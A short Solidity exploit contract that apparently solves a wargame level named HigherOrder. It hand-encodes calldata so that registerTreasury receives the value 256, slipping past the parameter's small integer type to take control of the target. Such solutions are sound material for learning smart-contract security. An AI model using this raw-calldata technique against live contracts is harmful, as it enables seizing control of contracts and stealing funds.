// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {HigherOrder} from "./HigherOrder.sol";

contract HigherOrderAttacker {
    bytes4 constant registerTreasurySelector = HigherOrder.registerTreasury.selector;
    HigherOrder public higherOrder;

    constructor(address _higherOrder) public {
        higherOrder = HigherOrder(address(_higherOrder));
    }

    function attack() public {
        bytes memory customCalldata = abi.encodePacked(registerTreasurySelector, bytes32(uint256(256)));

        (bool success,) = address(higherOrder).call(customCalldata);
        if (!success) {
            revert("Failed registerTreasury call");
        }
    }
}
